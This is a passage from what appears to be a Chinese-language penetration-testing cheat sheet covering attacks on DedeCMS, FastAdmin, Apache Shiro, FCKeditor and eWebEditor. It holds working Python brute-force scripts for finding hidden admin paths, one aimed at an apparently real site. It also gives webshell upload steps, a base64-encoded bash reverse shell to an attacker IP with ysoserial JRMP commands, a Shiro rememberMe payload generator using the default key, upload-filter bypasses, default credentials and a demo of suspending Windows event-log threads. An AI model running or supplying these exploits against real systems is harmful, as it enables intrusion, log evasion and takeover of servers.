number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>以下演示net user ola ola执行并更改用户的ola密码，并在6:55:30 PM记录事件4724</code></pre><p><img src="./img/821.png" alt="image"><br><img src="./img/822.png" alt="image"></p><pre><code>执行文件，svchost.exe中暂停了4个EventLog线程</code></pre><p><img src="./img/823.png" alt="image"><br><img src="./img/824.png" alt="image"></p><pre><code>再次执行修改密码命令</code></pre><p><img src="./img/825.png" alt="image"><br><img src="./img/826.png" alt="image"></p><pre><code>新的事件没有写入，只有挂起前的事件</code></pre><p><img src="./img/827.png" alt="image"></p><h2 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h2><h3 id="爆破后台"><a href="#爆破后台" class="headerlink" title="爆破后台"></a>爆破后台</h3><pre><code>windows服务器tags.php</code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> itertoolscharacters <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789_!#"</span>back_dir <span class="token operator">=</span> <span class="token string">""</span>flag <span class="token operator">=</span> <span class="token number">0</span>url <span class="token operator">=</span> <span class="token string">"http://www.test.com/tags.php"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"_FILES[mochazz][tmp_name]"</span> <span class="token punctuation">:</span> <span class="token string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span><span class="token punctuation">,</span>    <span class="token string">"_FILES[mochazz][name]"</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">"_FILES[mochazz][size]"</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">"_FILES[mochazz][type]"</span> <span class="token punctuation">:</span> <span class="token string">"image/gif"</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> pre <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span>characters<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        pre <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>pre<span class="token punctuation">)</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>p<span class="token operator">=</span>pre<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"testing"</span><span class="token punctuation">,</span>pre<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Upload filetype not allow !"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token keyword">and</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token number">1</span>            back_dir <span class="token operator">=</span> pre            data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 前缀为："</span><span class="token punctuation">,</span>back_dir<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> characters<span class="token punctuation">:</span>        <span class="token keyword">if</span> ch <span class="token operator">==</span> characters<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">break</span>        data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>p<span class="token operator">=</span>back_dir<span class="token operator">+</span>ch<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Upload filetype not allow !"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token keyword">and</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            back_dir <span class="token operator">+=</span> ch            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] "</span><span class="token punctuation">,</span>back_dir<span class="token punctuation">)</span>            data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            data<span class="token punctuation">[</span><span class="token string">"_FILES[mochazz][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"后台地址为："</span><span class="token punctuation">,</span>back_dir<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>rss.php</code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> syspayloads <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789_-'</span>menu <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token string">"dopost=save&amp;_FILES[b4dboy][tmp_name]=../%s%s&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif"</span><span class="token operator">%</span> <span class="token punctuation">(</span>menu<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://www.yx-tv.com/plus/rss.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            menu <span class="token operator">+=</span> payload            <span class="token keyword">break</span>        <span class="token keyword">if</span> payload <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>menu<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>menu<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="dedecms前台重置任意管理员密码"><a href="#dedecms前台重置任意管理员密码" class="headerlink" title="dedecms前台重置任意管理员密码"></a>dedecms前台重置任意管理员密码</h3><pre><code>https://xz.aliyun.com/t/1959</code></pre><h3 id="伪造cookie登录任意前台用户"><a href="#伪造cookie登录任意前台用户" class="headerlink" title="伪造cookie登录任意前台用户"></a>伪造cookie登录任意前台用户</h3><pre><code>注册用户user1访问/member/index.php?uid=user1登录user1将last_vid的值赋给DedeUserID，last_vidckMd5的值赋给DedeUserIDckMd5修改后的cookie</code></pre><h3 id="前台上传shell"><a href="#前台上传shell" class="headerlink" title="前台上传shell"></a>前台上传shell</h3><pre><code>Admin登录，发表文章，修改文件名1.jpg.p*hp后台文件上传访问/dede/tpl.php?action=uploadF12获取token访问/dede/tpl.php?filename=moonsec.lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=[token值]/dede/tpl.php?filename=moonsec.lib.php&amp;action=savetagfile&amp;content=&lt;?php phpinfo();?&gt;&amp;token=6d0c1893e01a77e7e6ba24fb2dc7599cShell位置/include/taglib/moonsec.lib.php</code></pre><h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><pre><code>模块-&gt;广告管理-&gt;新建广告，在广告内容中添加一句话/plus/ad_js.php?aid=[x]</code></pre><h2 id="FastAdmin前台getshell"><a href="#FastAdmin前台getshell" class="headerlink" title="FastAdmin前台getshell"></a>FastAdmin前台getshell</h2><pre><code>前台创建用户，修改头像，传图片马/public/index/user/_empty?name=../../public/uploads/20200926/4a91d432904c0042bcd038ea96ad4947.jpg</code></pre><h2 id="Shiro-rememberMe反序列化漏洞"><a href="#Shiro-rememberMe反序列化漏洞" class="headerlink" title="Shiro rememberMe反序列化漏洞"></a>Shiro rememberMe反序列化漏洞</h2><pre><code>Shiro相关转自bypass公众号https://github.com/insightglacier/Shiro_exploitpython shiro_exploit.py -u http://192.168.172.129:8080</code></pre><p><img src="./img/828.png" alt="image"></p><pre><code>通过获取到的key，常见的漏洞利用方式有两种：反弹shell和写入文件。反弹shell监听本地端口nc -lvp 1234Java Runtime 配合 bash 编码，在线编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html将bash -i &gt;&amp; /dev/tcp/192.168.172.133/1234 0&gt;&amp;1编码bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;使用shiro.py 生成Payloadpython shiro.py 192.168.172.133:6666</code></pre><p><img src="./img/829.png" alt="image"></p><pre><code>shiro.py代码如下</code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> uuid<span class="token keyword">import</span> base64<span class="token keyword">import</span> subprocess<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">def</span> <span class="token function">encode_rememberme</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>popen <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'-jar'</span><span class="token punctuation">,</span> <span class="token string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span><span class="token punctuation">,</span> <span class="token string">'JRMPClient'</span><span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>    BS <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size    pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span>    iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span>    encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    file_body <span class="token operator">=</span> pad<span class="token punctuation">(</span>popen<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    base64_ciphertext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>file_body<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> base64_ciphertext<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   payload <span class="token operator">=</span> encode_rememberme<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token string">"rememberMe=&#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>构造数据包，伪造cookie，发送Payload。</code></pre><p><img src="./img/830.png" alt="image"><br><img src="./img/831.png" alt="image"></p><pre><code>写入文件生成poc.ser文件sudo java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.ser使用Shiro内置的默认密钥对Payload进行加密：</code></pre><p><img src="./img/832.png" alt="image"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">shiro</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">AesCipherService</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span></span><span class="token class-name">CodecSupport</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ByteSource</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">DefaultSerializer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">FileSystems</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestRemember</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payloads <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">FileSystems</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token string">"d://poc.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">AesCipherService</span> aes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token class-name">CodecSupport</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteSource</span> ciphertext <span class="token operator">=</span> aes<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>payloads<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./img/833.png" alt="image"><br><img src="./img/834.png" alt="image"></p><h2 id="Shiro-Padding-Oracle-Attack"><a href="#Shiro-Padding-Oracle-Attack" class="headerlink" title="Shiro Padding Oracle Attack"></a>Shiro Padding Oracle Attack</h2><pre><code>登录Shiro网站，从cookie中获得rememberMe字段的值</code></pre><p><img src="./img/835.png" alt="image"></p><pre><code>利用DNSlog探测，通过ysoserial工具payload。java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping 75bbot.dnslog.cn&quot; &gt; payload.class使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击。java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePathhttps://github.com/longofo/PaddingOracleAttack-Shiro-721</code></pre><p><img src="./img/836.png" alt="image"><br><img src="./img/837.png" alt="image"></p><pre><code>使用构造的rememberMe攻击字符串重新请求网站</code></pre><p><img src="./img/838.png" alt="image"><br><img src="./img/839.png" alt="image"></p><pre><code>一键自动化漏洞利用工具https://github.com/feihong-cs/ShiroExploit</code></pre><h2 id="shiro权限绕过"><a href="#shiro权限绕过" class="headerlink" title="shiro权限绕过"></a>shiro权限绕过</h2><pre><code>/;/test/admin/page</code></pre><h2 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h2><h3 id="FCKeditor"><a href="#FCKeditor" class="headerlink" title="FCKeditor"></a>FCKeditor</h3><pre><code>版本FCKeditor/_whatsnew.html编辑器FCKeditor/_samples/default.htmlFCKeditor/_samples/default.htmlFCKeditor/_samples/asp/sample01.aspFCKeditor/_samples/asp/sample02.aspFCKeditor/_samples/asp/sample03.aspFCKeditor/_samples/asp/sample04.aspfckeditor/editor/filemanager/connectors/test.html上传FCKeditor/editor/filemanager/upload/test.htmlFCKeditor/editor/filemanager/browser/default/connectors/test.htmlFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connectorFCKeditor/editor/filemanager/connectors/test.htmlFCKeditor/editor/filemanager/connectors/uploadtest.html上传路径FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor被动限制策略所导致的过滤不严问题影响版本: FCKeditor x.x &lt;= FCKeditor v2.4.3脆弱描述：FCKeditor v2.4.3中File类别默认拒绝上传类型：html|htm|php|php2|php3|php4|php5|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc|pl|bat|exe|com|dll|vbs|js|reg|cgi|htaccess|asis|sh|shtml|shtm|phtmFckeditor 2.0 &lt;= 2.2允许上传asa、cer、php2、php4、inc、pwml、pht后缀的文件上传后 它保存的文件直接用的$sFilePath = $sServerDir . $sFileName，而没有使用$sExtension为后缀。直接导致在win下在上传文件后面加个.来突破[未测试]。而在apache下，因为”Apache文件名解析缺陷漏洞”也可以利用之，详见”附录A”另建议其他上传漏洞中定义TYPE变量时使用File类别来上传文件,根据FCKeditor的代码，其限制最为狭隘。攻击利用:允许其他任何后缀上传利用2003路径解析漏洞上传木马影响版本: 索引底部附录B脆弱描述：利用2003系统路径解析漏洞的原理，创建类似bin.asp如此一般的目录，再在此目录中上传文件即可被脚本解释器以相应脚本权限执行。攻击利用:fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp强制建立shell.asp目录：FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/shell.asp&amp;NewFolderName=z&amp;uuid=1244789975684orFCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=shell.aspFCKeditor PHP上传任意文件漏洞影响版本: FCKeditor 2.2 &lt;= FCKeditor 2.4.2脆弱描述：FCKeditor在处理文件上传时存在输入验证错误，远程攻击可以利用此漏洞上传任意文件。在通过editor/filemanager/upload/php/upload.php上传文件时攻击者可以通过为Type参数定义无效的值导致上传任意脚本。成功攻击要求config.php配置文件中启用文件上传，而默认是禁用的。攻击利用: (请修改action字段为指定网址)：&lt;form id=&quot;frmUpload&quot; enctype=&quot;multipart/form-data&quot; action=&quot;http://www.xxxx.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; method=&quot;post&quot;&gt;Upload a new file:&lt;br&gt;&lt;input type=&quot;file&quot; name=&quot;NewFile&quot; size=&quot;50&quot;&gt;&lt;br&gt;&lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;&lt;/form&gt;Note:如想尝试v2.2版漏洞，则修改Type=任意值 即可，但注意，如果换回使用Media则必须大写首字母M,否则LINUX下，FCKeditor会对文件目录进行文件名校验，不会上传成功的。FCKeditor 暴路径漏洞影响版本：aspx版FCKeditor攻击利用：FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/1.aspFCKeditor 文件上传“.”变“_”下划线的绕过方法影响版本: FCKeditor =&gt; 2.4.x脆弱描述：我们上传的文件例如：shell.php.rar或shell.php;.jpg会变为shell_php;.jpg这是新版FCK的变化。攻击利用:提交1.php+空格 就可以绕过去所有的,※不过空格只支持win系统 *nix是不支持的[1.php和1.php+空格是2个不同的文件]Note:http://pstgroup.blogspot.com/2007/05/tipsfckeditor.htmlFCKeditor 文件上传“.”变“_”下划线的绕过方法（二）影响版本:=&gt;2.4.x的最新版已修补脆弱描述:由于Fckeditor对第一次上传123.asp;123.jpg 这样的格式做了过滤。也就是IIS6解析漏洞。上传第一次。被过滤为123_asp;123.jpg 从而无法运行。但是第2次上传同名文件123.asp;123.jpg后。由于”123_asp;123.jpg”已经存在。文件名被命名为123.asp;123(1).jpg …… 123.asp;123(2).jpg这样的编号方式。所以。IIS6的漏洞继续执行了。如果通过上面的步骤进行测试没有成功，可能有以下几方面的原因：1.FCKeditor没有开启文件上传功能，这项功能在安装FCKeditor时默认是关闭的。如果想上传文件，FCKeditor会给出错误提示。2.网站采用了精简版的FCKeditor，精简版的FCKeditor很多功能丢失，包括文件上传功能。3.FCKeditor的这个漏洞已经被修复。FCKeditor 新闻组件遍历目录漏洞影响版本:Aspx与JSP版FCKeditor脆弱描述：如何获得webshell请参考上文“TYPE自定义变量任意上传文件漏洞”攻击利用:修改CurrentFolder参数使用 ../../来进入不同的目录/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../../..%2F&amp;NewFolderName=aspx.asp根据返回的XML信息可以查看网站所有的目录。/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%2FTYPE自定义变量任意上传文件漏洞影响版本: 较早版本脆弱描述：通过自定义Type变量的参数，可以创建或上传文件到指定的目录中去，且没有上传文件格式的限制。攻击利用:/FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&amp;Connector=connectors/asp/connector.asp打开这个地址就可以上传任何类型的文件了，Shell上传到的默认位置是:http://www.xxxx.com/UserFiles/all/1.aspType=all 这个变量是自定义的,在这里创建了all这个目录,而且新的目录没有上传文件格式的限制.比如输入:/FCKeditor/editor/filemanager/browser/default/browser.html?Type=../&amp;Connector=connectors/asp/connector.asp网马就可以传到网站的根目录下.Note:如找不到默认上传文件夹可检查此文件:fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</code></pre><h3 id="eWebEditor"><a href="#eWebEditor" class="headerlink" title="eWebEditor"></a>eWebEditor</h3><pre><code>eWebEditor 基础知识默认后台地址：/ewebeditor/admin_login.asp/WebEdior/admin/login.aspx建议最好检测下admin_style.asp文件是否可以直接访问默认数据库路径：[PATH]/db/ewebeditor.mdb[PATH]/db/db.mdb[PATH]/db/%23ewebeditor.mdb默认密码：admin/admin888 、 admin/admin、 admin/123456 